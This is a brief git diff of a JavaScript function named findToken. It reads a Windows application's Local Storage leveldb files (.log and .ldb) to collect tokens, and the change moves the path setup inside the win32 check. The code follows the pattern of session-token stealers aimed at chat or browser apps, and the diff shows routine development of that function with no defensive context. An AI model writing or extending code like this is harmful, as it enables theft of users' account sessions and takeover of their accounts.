@@ -3,11 +3,12 @@ const path = require('path')
 
 const findToken = (tokenPath) => {
   const computerPlatform = process.platform
-  tokenPath += '\\Local Storage\\leveldb'
 
   let tokens = []
 
   if (computerPlatform == 'win32') {
+    tokenPath += '\\Local Storage\\leveldb'
+
     try {
       fs.readdirSync(path.normalize(tokenPath)).map((file) => {
         if (file.endsWith('.log') || file.endsWith('.ldb')) {
